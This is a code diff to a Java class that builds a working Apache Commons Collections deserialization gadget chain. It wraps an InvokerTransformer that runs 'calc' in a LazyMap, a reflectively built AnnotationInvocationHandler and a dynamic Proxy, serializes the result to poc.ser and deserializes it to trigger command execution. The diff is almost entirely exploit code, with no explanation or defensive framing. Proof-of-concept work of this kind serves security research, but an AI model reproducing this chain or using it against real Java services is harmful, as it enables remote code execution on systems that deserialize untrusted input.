@@ -26,11 +26,27 @@ public class App {
             new InvokerTransformer("exec",
                     new Class[]{String.class}, new Object[]{"calc"})
         });
-        chainedTransformer.transform(null);
 
+        LazyMap lazyMap = (LazyMap) LazyMap.decorate(new HashMap(), chainedTransformer);
 
+        Constructor annotationInvocationHandler =
+                Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").
+                        getDeclaredConstructor(Class.class, Map.class);
+        annotationInvocationHandler.setAccessible(true);
+        InvocationHandler annoHandler = (InvocationHandler) annotationInvocationHandler.
+                newInstance(Override.class, lazyMap);
+
+        Map map = (Map) Proxy.
+                newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, annoHandler);
+
+        InvocationHandler anotherHandler = (InvocationHandler) annotationInvocationHandler.
+                newInstance(Override.class, map);
 
         try {
+            FileOutputStream ofs = new FileOutputStream(new File("poc.ser"));
+            ObjectOutputStream oos = new ObjectOutputStream(ofs);
+            oos.writeObject(anotherHandler);
+
             FileInputStream ifs = new FileInputStream(new File("poc.ser"));
             ObjectInputStream ois = new ObjectInputStream(ifs);
             ois.readObject();
